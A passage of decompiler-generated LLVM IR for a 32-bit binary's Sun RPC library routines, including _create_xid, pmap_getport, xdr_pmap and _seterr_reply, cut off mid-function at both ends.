  %v1_8055f71 = inttoptr i32 %v0_8055f71 to i32*
  %v3_8055f71 = add i32 %v0_8055f71, 4
  store i32 %v2_8055f72, i32* @edi, align 4
  %v1_8055f78 = inttoptr i32 %v3_8055f71 to i32*
  %v2_8055f78 = load i32, i32* %v1_8055f78, align 4
  store i32 %v2_8055f78, i32* @eax, align 4
  store i32 %v2_8055f72, i32* %v1_8055f78, align 4
  store i32 %v2_8055f68, i32* %v1_8055f71, align 4
  %v0_8055f7b = call i32 @__GI_xdr_replymsg()
  store i32 %v0_8055f7b, i32* %eax.global-to-local, align 4
  %v0_8055f80 = load i32, i32* @esp, align 4
  %v1_8055f83 = icmp eq i32 %v0_8055f7b, 0
  br i1 %v1_8055f83, label %dec_label_pc_8056017, label %dec_label_pc_8055f8b

dec_label_pc_8055f8b:                             ; preds = %dec_label_pc_8055f64
  %v0_8055f8b = load i32, i32* @ecx, align 4
  %v2_8055f8b = add i32 %v0_8055f80, 12
  %v3_8055f8b = inttoptr i32 %v2_8055f8b to i32*
  store i32 %v0_8055f8b, i32* %v3_8055f8b, align 4
  %v0_8055f8c = load i32, i32* @ecx, align 4
  %v2_8055f8c = add i32 %v0_8055f80, 8
  %v3_8055f8c = inttoptr i32 %v2_8055f8c to i32*
  store i32 %v0_8055f8c, i32* %v3_8055f8c, align 4
  %v0_8055f8d = load i32, i32* @esi, align 4
  %v1_8055f8d = add i32 %v0_8055f8d, 44
  store i32 %v1_8055f8d, i32* %eax.global-to-local, align 4
  %v2_8055f90 = add i32 %v0_8055f80, 4
  %v3_8055f90 = inttoptr i32 %v2_8055f90 to i32*
  store i32 %v1_8055f8d, i32* %v3_8055f90, align 4
  %v3_8055f91 = inttoptr i32 %v0_8055f80 to i32*
  store i32 %v2_8055f72, i32* %v3_8055f91, align 4
  %v0_8055f92 = call i32 @__GI__seterr_reply()
  store i32 %v0_8055f92, i32* %eax.global-to-local, align 4
  %v0_8055f97 = load i32, i32* @esp, align 4
  %v0_8055f9a = load i32, i32* @esi, align 4
  %v1_8055f9a = add i32 %v0_8055f9a, 44
  %v2_8055f9a = inttoptr i32 %v1_8055f9a to i32*
  %v3_8055f9a = load i32, i32* %v2_8055f9a, align 4
  %v4_8055f9a = icmp eq i32 %v3_8055f9a, 0
  %v1_8055f9e = icmp eq i1 %v4_8055f9a, false
  br i1 %v1_8055f9e, label %dec_label_pc_8055fed, label %dec_label_pc_8055fa0

dec_label_pc_8055fa0:                             ; preds = %dec_label_pc_8055f8b
  store i32 %tmp107, i32* %edx.global-to-local, align 4
  store i32 %v2_8055c5f, i32* @ebx, align 4
  %v2_8055fa9 = load i32, i32* %arg1, align 4
  store i32 %v2_8055fa9, i32* %eax.global-to-local, align 4
  %v2_8055fab = add i32 %v0_8055f97, 12
  %v3_8055fab = inttoptr i32 %v2_8055fab to i32*
  store i32 %tmp107, i32* %v3_8055fab, align 4
  %v0_8055fac = load i32, i32* %edx.global-to-local, align 4
  %v2_8055fac = add i32 %v0_8055f97, 8
  %v3_8055fac = inttoptr i32 %v2_8055fac to i32*
  store i32 %v0_8055fac, i32* %v3_8055fac, align 4
  %v1_8055fad = add i32 %v2_8055fa9, 32
  %v2_8055fad = inttoptr i32 %v1_8055fad to i32*
  %v3_8055fad = load i32, i32* %v2_8055fad, align 4
  store i32 %v3_8055fad, i32* %edx.global-to-local, align 4
  %v2_8055fb0 = add i32 %v0_8055f97, 4
  %v3_8055fb0 = inttoptr i32 %v2_8055fb0 to i32*
  store i32 %v2_8055c5f, i32* %v3_8055fb0, align 4
  %v3_8055fb1 = inttoptr i32 %v0_8055f97 to i32*
  store i32 %v2_8055fa9, i32* %v3_8055fb1, align 4
  %v1_8055fb2 = add i32 %v0_8055f97, -4
  %v2_8055fb2 = inttoptr i32 %v1_8055fb2 to i32*
  store i32 134569909, i32* %v2_8055fb2, align 4
  %v3_8055fb2 = load i32, i32* %edx.global-to-local, align 4
  %v4_8055fb2 = add i32 %v3_8055fb2, 8
  %v5_8055fb2 = inttoptr i32 %v4_8055fb2 to i32*
  %v6_8055fb2 = load i32, i32* %v5_8055fb2, align 4
  call void @__pseudo_call(i32 %v6_8055fb2)
  %v1_8055fb8 = icmp eq i32 %v2_8055fa9, 0
  %v1_8055fba = icmp eq i1 %v1_8055fb8, false
  br i1 %v1_8055fba, label %dec_label_pc_8055fca, label %dec_label_pc_8055fbc

dec_label_pc_8055fbc:                             ; preds = %dec_label_pc_8055fa0
  %v0_8055fbc = load i32, i32* @esi, align 4
  %v1_8055fbc = add i32 %v0_8055fbc, 44
  %v2_8055fbc = inttoptr i32 %v1_8055fbc to i32*
  store i32 7, i32* %v2_8055fbc, align 4
  %v0_8055fc3 = load i32, i32* @esi, align 4
  %v1_8055fc3 = add i32 %v0_8055fc3, 48
  %v2_8055fc3 = inttoptr i32 %v1_8055fc3 to i32*
  store i32 6, i32* %v2_8055fc3, align 4
  br label %dec_label_pc_8055fca

dec_label_pc_8055fca:                             ; preds = %dec_label_pc_8055fa0, %dec_label_pc_8055fbc
  %v4_8055fca = icmp eq i32 %tmp, 0
  br i1 %v4_8055fca, label %dec_label_pc_805601e, label %dec_label_pc_8055fd3

dec_label_pc_8055fd3:                             ; preds = %dec_label_pc_8055fca
  store i32 %v1_8055b76, i32* %ecx.global-to-local, align 4
  %v1_8055fd9 = inttoptr i32 %v1_8055b76 to i32*
  store i32 2, i32* %v1_8055fd9, align 4
  %v1_8055fdf = load i32, i32* @esp, align 4
  %v2_8055fdf = add i32 %v1_8055fdf, -4
  %v3_8055fdf = inttoptr i32 %v2_8055fdf to i32*
  store i32 %v2_8055f72, i32* %v3_8055fdf, align 4
  %v2_8055fe0 = add i32 %v1_8055fdf, -8
  %v3_8055fe0 = inttoptr i32 %v2_8055fe0 to i32*
  store i32 %v2_8055f72, i32* %v3_8055fe0, align 4
  %v2_8055fe1 = add i32 %v1_8055fdf, -12
  %v3_8055fe1 = inttoptr i32 %v2_8055fe1 to i32*
  store i32 %v2_8055c5f, i32* %v3_8055fe1, align 4
  %v0_8055fe2 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8055fe2 = add i32 %v1_8055fdf, -16
  %v3_8055fe2 = inttoptr i32 %v2_8055fe2 to i32*
  store i32 %v0_8055fe2, i32* %v3_8055fe2, align 4
  %v0_8055fe3 = load i32, i32* %stack_var_-20, align 4
  %v2_8055fe3 = call i32 @xdr_opaque_auth(i32 %v0_8055fe3, i32 %v0_8055ad7)
  store i32 %v2_8055fe3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805601e

dec_label_pc_8055fed:                             ; preds = %dec_label_pc_8055f8b
  %tmp129 = icmp slt i32 %stack_var_-9020.0, 1
  br i1 %tmp129, label %dec_label_pc_805601e, label %dec_label_pc_8055ff6

dec_label_pc_8055ff6:                             ; preds = %dec_label_pc_8055fed
  store i32 %tmp107, i32* @ebx, align 4
  %v2_8055ffc = load i32, i32* %arg1, align 4
  store i32 %v2_8055ffc, i32* %eax.global-to-local, align 4
  %v1_8055ffe = add i32 %v2_8055ffc, 32
  %v2_8055ffe = inttoptr i32 %v1_8055ffe to i32*
  %v3_8055ffe = load i32, i32* %v2_8055ffe, align 4
  store i32 %v3_8055ffe, i32* %edx.global-to-local, align 4
  %v3_8056001 = inttoptr i32 %v0_8055f97 to i32*
  store i32 %v2_8055ffc, i32* %v3_8056001, align 4
  %v1_8056002 = add i32 %v0_8055f97, -4
  %v2_8056002 = inttoptr i32 %v1_8056002 to i32*
  store i32 134569989, i32* %v2_8056002, align 4
  %v3_8056002 = load i32, i32* %edx.global-to-local, align 4
  %v4_8056002 = add i32 %v3_8056002, 12
  %v5_8056002 = inttoptr i32 %v4_8056002 to i32*
  %v6_8056002 = load i32, i32* %v5_8056002, align 4
  call void @__pseudo_call(i32 %v6_8056002)
  %v1_8056008 = icmp eq i32 %v2_8055ffc, 0
  br i1 %v1_8056008, label %dec_label_pc_805601e, label %dec_label_pc_805600c

dec_label_pc_805600c:                             ; preds = %dec_label_pc_8055ff6
  %v0_8056005 = load i32, i32* @esp, align 4
  %v1_8056005 = add i32 %v0_8056005, 16
  %v4_805600c = add i32 %stack_var_-9020.0, -1
  %v0_8055b76.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8055b72

dec_label_pc_8056017:                             ; preds = %dec_label_pc_8055f64
  %v0_8056017 = load i32, i32* @esi, align 4
  %v1_8056017 = add i32 %v0_8056017, 44
  %v2_8056017 = inttoptr i32 %v1_8056017 to i32*
  store i32 2, i32* %v2_8056017, align 4
  br label %dec_label_pc_805601e

dec_label_pc_805601e:                             ; preds = %dec_label_pc_8055ff6, %dec_label_pc_8055fed, %dec_label_pc_8055fca, %dec_label_pc_8055fd3, %dec_label_pc_8056017
  %v0_805601e = load i32, i32* @esi, align 4
  %v1_805601e = add i32 %v0_805601e, 44
  %v2_805601e = inttoptr i32 %v1_805601e to i32*
  %v3_805601e = load i32, i32* %v2_805601e, align 4
  store i32 %v3_805601e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056021

dec_label_pc_8056021:                             ; preds = %dec_label_pc_8055f36, %dec_label_pc_8055da5, %dec_label_pc_8055b15, %dec_label_pc_8055bed, %dec_label_pc_805601e
  %v0_8056028 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8056028

; uselistorder directives
  uselistorder i32 %v2_8055fa9, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8055f97, { 5, 6, 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_8055f80, { 3, 0, 1, 2 }
  uselistorder i32 %v1_8055f19, { 1, 2, 0 }
  uselistorder i32 %v1_8055f10, { 1, 0 }
  uselistorder i32 %v6_8055f0b, { 2, 4, 3, 5, 1, 0 }
  uselistorder i32 %v1_8055eef, { 0, 1, 2, 7, 6, 5, 4, 3 }
  uselistorder i32 %v0_8055ee3, { 0, 2, 3, 1 }
  uselistorder i32 %v0_8055b30, { 1, 2, 0 }
  uselistorder i32 %v1_8055ed9, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8055e64, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_8055e4c, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v2_8055df7, { 0, 3, 2, 1, 4 }
  uselistorder i32 %storemerge7.in.lcssa, { 1, 2, 0 }
  uselistorder i32 %v4_8055d73, { 1, 0 }
  uselistorder i32 %v4_8055d69, { 0, 2, 1 }
  uselistorder i32 %v1_8055d20, { 2, 1, 0 }
  uselistorder i32 %v3_8055d1b, { 1, 2, 0 }
  uselistorder i32 %stack_var_-9016.3155, { 5, 6, 7, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8055cbb, { 2, 3, 4, 5, 6, 1, 0 }
  uselistorder i32 %v0_8055c9d, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_8055c98, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8055c8b, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-9028.2, { 2, 3, 5, 4, 1, 0 }
  uselistorder i32 %stack_var_-9008.2, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v1_8055c57, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-9028.1, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_8055c17, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8055bd1, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v2_8055bc0, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v0_8055bb6, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_8055b76, { 1, 0, 2, 4, 5, 6, 7, 8, 3, 9 }
  uselistorder i32 %stack_var_-9020.0, { 2, 0, 3, 1 }
  uselistorder i32 %stack_var_-9008.0, { 1, 0 }
  uselistorder i32 %stack_var_-9004.0, { 1, 0 }
  uselistorder i32 %stack_var_-9012.0, { 1, 0 }
  uselistorder i32 %stack_var_-9016.0, { 1, 0 }
  uselistorder i32 %v0_8055b85, { 1, 0 }
  uselistorder i32 %v2_8055f72, { 2, 3, 4, 5, 6, 1, 0 }
  uselistorder i32 %v2_8055e1e, { 2, 3, 4, 5, 0, 1 }
  uselistorder i1 %v4_8055b72, { 1, 0 }
  uselistorder i32 %storemerge3, { 0, 4, 3, 2, 1 }
  uselistorder i32 %stack_var_-9000.0, { 1, 0, 2 }
  uselistorder i32 %v3_8055afb, { 2, 1, 0 }
  uselistorder i32 %v2_8055af3, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8055ae6, { 1, 0, 2 }
  uselistorder i32 %v0_8055ad7, { 1, 2, 0 }
  uselistorder i32 %v0_8055ad6, { 1, 0 }
  uselistorder i32 %v0_8055ad5, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i16* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %tmp107, { 5, 0, 4, 3, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 51, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 37, 15, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 38, 39, 40, 41, 42, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 17, 43, 44, 45, 60, 59, 61, 62, 63 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 1, 0 }
  uselistorder i32 92, { 2, 4, 0, 1, 3 }
  uselistorder i32 ()* @bcmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_recvmsg, { 1, 0 }
  uselistorder i32 8800, { 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 1, 0 }
  uselistorder i32 -24, { 0, 2, 3, 1 }
  uselistorder i64 1000, { 1, 0, 2 }
  uselistorder i32 1000, { 0, 1, 3, 2 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8056021, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805601e, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8055fca, { 1, 0 }
  uselistorder label %dec_label_pc_8055f36, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8055f2d, { 1, 0 }
  uselistorder label %dec_label_pc_8055eef, { 9, 8, 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8055ec9, { 1, 0 }
  uselistorder label %dec_label_pc_8055d63, { 1, 0 }
  uselistorder label %dec_label_pc_8055cfa, { 1, 0 }
  uselistorder label %dec_label_pc_8055c8b, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8055b4a, { 1, 0 }
}

define i32 @_create_xid() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805602c = load i32, i32* @ebx, align 4
  store i32 %v0_805602c, i32* %stack_var_-4, align 4
  %v2_805603a = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805603a, i32* @ebx, align 4
  %v4_805603f = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134541533, i32 ptrtoint (i32* @global_var_8067748.298 to i32))
  %v1_805604b = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8067748.298 to i32))
  %v0_8056053 = load i8, i8* @global_var_8067760.299, align 32
  %v1_8056053 = icmp eq i8 %v0_8056053, 0
  %v1_805605a = icmp eq i1 %v1_8056053, false
  br i1 %v1_805605a, label %dec_label_pc_8056089, label %dec_label_pc_805605c

dec_label_pc_805605c:                             ; preds = %entry
  %v0_805605c = load i32, i32* @ecx, align 4
  %v2_8056060 = ptrtoint i32* %stack_var_-16 to i32
  %v4_8056065 = call i32 @gettimeofday(i32 %v2_8056060, i32 0, i32 %v0_805605c, i32 %v0_805605c)
  %v4_8056075 = load i32, i32* %stack_var_-16, align 4
  %v5_8056075 = xor i32 %v4_8056075, %tmp
  %v2_805607a = trunc i32 %v5_8056075 to i16
  %v3_805607a = call i32 @__GI_srand48_r(i16 %v2_805607a, i32 ptrtoint (i32* @global_var_8067764.300 to i32))
  store i8 1, i8* @global_var_8067760.299, align 32
  br label %dec_label_pc_8056089

dec_label_pc_8056089:                             ; preds = %entry, %dec_label_pc_805605c
  %v2_8056089 = ptrtoint i32* %stack_var_-8 to i32
  %v0_805608d = load i32, i32* @ecx, align 4
  %v4_8056095 = call i32 @lrand48_r(i32 ptrtoint (i32* @global_var_8067764.300 to i32), i32 %v2_8056089, i32 %v0_805608d, i32 %v0_805608d)
  %v3_805609f = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v3_80560a4 = load i32, i32* %stack_var_-8, align 4
  %v2_80560ab = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80560ab, i32* @ebx, align 4
  ret i32 %v3_80560a4

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_8067764.300 to i32), { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @gettimeofday, { 0, 2, 1 }
  uselistorder i8* @global_var_8067760.299, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8067748.298 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_8056089, { 1, 0 }
}

define i32 @pmap_getport(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-14 = alloca i16, align 2
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80560b0 = load i32, i32* @edi, align 4
  %v0_80560b2 = load i32, i32* @ebx, align 4
  store i32 %v0_80560b2, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* @edi, align 4
  store i16 0, i16* %stack_var_-14, align 2
  store i32 -1, i32* %stack_var_-20, align 4
  %v1_80560c9 = add i32 %arg1, 2
  %v2_80560c9 = inttoptr i32 %v1_80560c9 to i16*
  store i16 28416, i16* %v2_80560c9, align 2
  %v2_80560d9 = ptrtoint i32* %stack_var_-20 to i32
  %v0_80560f1 = load i32, i32* @edi, align 4
  %v9_80560f2 = call i32 @__GI_clntudp_bufcreate(i32 %v0_80560f1, i32 100000, i32 2, i32 5, i32* null, i32 %v2_80560d9, i32 400, i32 400)
  %v1_80560fa = icmp eq i32 %v9_80560f2, 0
  store i32 %v9_80560f2, i32* @ebx, align 4
  br i1 %v1_80560fa, label %dec_label_pc_805618d, label %dec_label_pc_8056180

dec_label_pc_8056180:                             ; preds = %entry
  %v0_8056104 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_8056104, i32* %esi.global-to-local, align 4
  %v0_8056133 = load i32, i32* @ebx, align 4
  %v1_8056133 = add i32 %v0_8056133, 4
  %v2_8056133 = inttoptr i32 %v1_8056133 to i32*
  %v3_8056133 = load i32, i32* %v2_8056133, align 4
  store i32 %v3_8056133, i32* @ecx, align 4
  %v5_8056151 = inttoptr i32 %v3_8056133 to i32*
  %v6_8056151 = load i32, i32* %v5_8056151, align 4
  call void @__pseudo_call(i32 %v6_8056151)
  %v0_805615a = load i32, i32* %esi.global-to-local, align 4
  %v1_805615a = inttoptr i32 %v0_805615a to i32*
  store i32 14, i32* %v1_805615a, align 4
  %v0_8056162 = load i32, i32* @ebx, align 4
  %v1_8056162 = add i32 %v0_8056162, 4
  %v2_8056162 = inttoptr i32 %v1_8056162 to i32*
  %v3_8056162 = load i32, i32* %v2_8056162, align 4
  %v5_805616a = add i32 %v3_8056162, 8
  %v6_805616a = inttoptr i32 %v5_805616a to i32*
  %v7_805616a = load i32, i32* %v6_805616a, align 4
  call void @__pseudo_call(i32 %v7_805616a)
  %v0_8056180 = load i32, i32* @ebx, align 4
  %v1_8056180 = add i32 %v0_8056180, 4
  %v2_8056180 = inttoptr i32 %v1_8056180 to i32*
  %v3_8056180 = load i32, i32* %v2_8056180, align 4
  %v5_8056187 = add i32 %v3_8056180, 16
  %v6_8056187 = inttoptr i32 %v5_8056187 to i32*
  %v7_8056187 = load i32, i32* %v6_8056187, align 4
  call void @__pseudo_call(i32 %v7_8056187)
  br label %dec_label_pc_805618d

dec_label_pc_805618d:                             ; preds = %entry, %dec_label_pc_8056180
  %v0_805618d = load i32, i32* @edi, align 4
  %v1_805618d = add i32 %v0_805618d, 2
  %v2_805618d = inttoptr i32 %v1_805618d to i16*
  store i16 0, i16* %v2_805618d, align 2
  %v3_8056193 = load i16, i16* %stack_var_-14, align 2
  %v4_8056193 = sext i16 %v3_8056193 to i32
  %v2_805619b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805619b, i32* @ebx, align 4
  store i32 %v0_80560b0, i32* @edi, align 4
  ret i32 %v4_8056193

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i16* %stack_var_-14, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805618d, { 1, 0 }
}

define i32 @__GI_xdr_pmap(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %v0_80561a0 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  %v2_80561af = inttoptr i32 %arg1 to i32*
  %v3_80561af = call i32 @xdr_u_long(i32* %v2_80561af, i32 %arg2)
  %v1_80561b7 = icmp eq i32 %v3_80561af, 0
  br i1 %v1_80561b7, label %dec_label_pc_80561f4, label %dec_label_pc_80561bb

dec_label_pc_80561bb:                             ; preds = %entry
  %v0_80561bd = load i32, i32* @ebx, align 4
  %v1_80561bd = add i32 %v0_80561bd, 4
  store i32 %v1_80561bd, i32* @eax, align 4
  %v0_80561c1 = load i32, i32* %esi.global-to-local, align 4
  %v2_80561c2 = inttoptr i32 %v0_80561c1 to i32*
  %v3_80561c2 = call i32 @xdr_u_long(i32* %v2_80561c2, i32 %v1_80561bd)
  %v1_80561ca = icmp eq i32 %v3_80561c2, 0
  br i1 %v1_80561ca, label %dec_label_pc_80561f4, label %dec_label_pc_80561ce

dec_label_pc_80561ce:                             ; preds = %dec_label_pc_80561bb
  %v0_80561d0 = load i32, i32* @ebx, align 4
  %v1_80561d0 = add i32 %v0_80561d0, 8
  store i32 %v1_80561d0, i32* @eax, align 4
  %v0_80561d4 = load i32, i32* %esi.global-to-local, align 4
  %v2_80561d5 = inttoptr i32 %v0_80561d4 to i32*
  %v3_80561d5 = call i32 @xdr_u_long(i32* %v2_80561d5, i32 %v1_80561d0)
  %v1_80561dd = icmp eq i32 %v3_80561d5, 0
  br i1 %v1_80561dd, label %dec_label_pc_80561f4, label %dec_label_pc_80561e1

dec_label_pc_80561e1:                             ; preds = %dec_label_pc_80561ce
  %v0_80561e1 = load i32, i32* @ebx, align 4
  %v1_80561e1 = add i32 %v0_80561e1, 12
  store i32 %v1_80561e1, i32* @eax, align 4
  %v0_80561e4 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_80561a0, i32* %esi.global-to-local, align 4
  %v2_80561ef = inttoptr i32 %v0_80561e4 to i32*
  %v3_80561ef = call i32 @xdr_u_long(i32* %v2_80561ef, i32 %v1_80561e1)
  br label %dec_label_pc_80561f4

dec_label_pc_80561f4:                             ; preds = %dec_label_pc_80561ce, %dec_label_pc_80561bb, %entry, %dec_label_pc_80561e1
  store i32 %v0_80561a0, i32* %esi.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_80561a0, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80561f4, { 3, 0, 1, 2 }
}

define i32 @__GI__seterr_reply() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* %ecx.global-to-local, align 4
  store i32 %tmp, i32* %edx.global-to-local, align 4
  %v1_8056204 = add i32 %tmp2, 8
  %v2_8056204 = inttoptr i32 %v1_8056204 to i32*
  %v3_8056204 = load i32, i32* %v2_8056204, align 4
  store i32 %v3_8056204, i32* %eax.global-to-local, align 4
  %v1_8056207 = icmp eq i32 %v3_8056204, 0
  br i1 %v1_8056207, label %dec_label_pc_8056214, label %dec_label_pc_805620b

dec_label_pc_805620b:                             ; preds = %entry
  %v1_805620b = add i32 %v3_8056204, -1
  %v8_805620b = icmp eq i32 %v1_805620b, 0
  store i32 %v1_805620b, i32* %eax.global-to-local, align 4
  %v1_805620c = icmp eq i1 %v8_805620b, false
  br i1 %v1_805620c, label %dec_label_pc_805629c, label %dec_label_pc_805626d

dec_label_pc_8056214:                             ; preds = %entry
  %v1_8056214 = add i32 %tmp2, 24
  %v2_8056214 = inttoptr i32 %v1_8056214 to i32*
  %v3_8056214 = load i32, i32* %v2_8056214, align 4
  store i32 %v3_8056214, i32* %eax.global-to-local, align 4
  %v1_8056217 = icmp eq i32 %v3_8056214, 0
  %v1_8056219 = icmp eq i1 %v1_8056217, false
  br i1 %v1_8056219, label %dec_label_pc_8056222, label %dec_label_pc_805621b

dec_label_pc_805621b:                             ; preds = %dec_label_pc_8056214
  %v1_805621b = inttoptr i32 %tmp to i32*
  store i32 0, i32* %v1_805621b, align 4
  %v0_8056221 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8056221

dec_label_pc_8056222:                             ; preds = %dec_label_pc_8056214
  switch i32 %tmp2, label %dec_label_pc_805625e [
    i32 0, label %dec_label_pc_8056256
    i32 1, label %dec_label_pc_805622e
    i32 2, label %dec_label_pc_8056236
    i32 3, label %dec_label_pc_805623e
    i32 4, label %dec_label_pc_8056246
    i32 5, label %dec_label_pc_805624e
  ]

dec_label_pc_805622e:                             ; preds = %dec_label_pc_8056222
  %v1_805622e = inttoptr i32 %tmp to i32*
  store i32 8, i32* %v1_805622e, align 4
  br label %dec_label_pc_80562a8

dec_label_pc_8056236:                             ; preds = %dec_label_pc_8056222
  %v1_8056236 = inttoptr i32 %tmp to i32*
  store i32 9, i32* %v1_8056236, align 4
  br label %dec_label_pc_80562a8

dec_label_pc_805623e:                             ; preds = %dec_label_pc_8056222
  %v1_805623e = inttoptr i32 %tmp to i32*
  store i32 10, i32* %v1_805623e, align 4
  br label %dec_label_pc_80562a8

dec_label_pc_8056246:                             ; preds = %dec_label_pc_8056222
  %v1_8056246 = inttoptr i32 %tmp to i32*
  store i32 11, i32* %v1_8056246, align 4
  br label %dec_label_pc_80562a8

dec_label_pc_805624e:                             ; preds = %dec_label_pc_8056222
  %v1_805624e = inttoptr i32 %tmp to i32*
  store i32 12, i32* %v1_805624e, align 4
  br label %dec_label_pc_80562a8

dec_label_pc_8056256:                             ; preds = %dec_label_pc_8056222
  %v1_8056256 = inttoptr i32 %tmp to i32*
  store i32 0, i32* %v1_8056256, align 4
  br label %dec_label_pc_80562a8

dec_label_pc_805625e:                             ; preds = %dec_label_pc_8056222
  %v1_805625e = inttoptr i32 %tmp to i32*
  store i32 16, i32* %v1_805625e, align 4
  %v0_8056264 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056264 = add i32 %v0_8056264, 4
  %v2_8056264 = inttoptr i32 %v1_8056264 to i32*
  store i32 0, i32* %v2_8056264, align 4
  br label %dec_label_pc_8056297

dec_label_pc_805626d:                             ; preds = %dec_label_pc_805620b
  %v1_805626d = add i32 %tmp2, 12
  %v2_805626d = inttoptr i32 %v1_805626d to i32*
  %v3_805626d = load i32, i32* %v2_805626d, align 4
  store i32 %v3_805626d, i32* %eax.global-to-local, align 4
  %v9_8056270 = icmp eq i32 %v3_805626d, 1
  br i1 %v9_8056270, label %dec_label_pc_8056282, label %dec_label_pc_8056275

dec_label_pc_8056275:                             ; preds = %dec_label_pc_805626d
  %v9_8056275 = icmp eq i32 %v3_805626d, 6
  %v1_8056278 = icmp eq i1 %v9_8056275, false
  %v1_805628a = inttoptr i32 %tmp to i32*
  br i1 %v1_8056278, label %dec_label_pc_805628a, label %dec_label_pc_805627a

dec_label_pc_805627a:                             ; preds = %dec_label_pc_8056275
  store i32 6, i32* %v1_805628a, align 4
  br label %dec_label_pc_80562a8

dec_label_pc_8056282:                             ; preds = %dec_label_pc_805626d
  %v1_8056282 = inttoptr i32 %tmp to i32*
  store i32 7, i32* %v1_8056282, align 4
  br label %dec_label_pc_80562a8

dec_label_pc_805628a:                             ; preds = %dec_label_pc_8056275
  store i32 16, i32* %v1_805628a, align 4
  %v0_8056290 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056290 = add i32 %v0_8056290, 4
  %v2_8056290 = inttoptr i32 %v1_8056290 to i32*
  store i32 1, i32* %v2_8056290, align 4
  br label %dec_label_pc_8056297

dec_label_pc_8056297:                             ; preds = %dec_label_pc_805625e, %dec_label_pc_805628a
  %v0_8056297 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056297 = load i32, i32* %edx.global-to-local, align 4
  %v2_8056297 = add i32 %v1_8056297, 8
  %v3_8056297 = inttoptr i32 %v2_8056297 to i32*
  store i32 %v0_8056297, i32* %v3_8056297, align 4
  br label %dec_label_pc_80562a8

dec_label_pc_805629c:                             ; preds = %dec_label_pc_805620b
  %v1_805629c = inttoptr i32 %tmp to i32*
  store i32 16, i32* %v1_805629c, align 4
  %v0_80562a2 = load i32, i32* %ecx.global-to-local, align 4
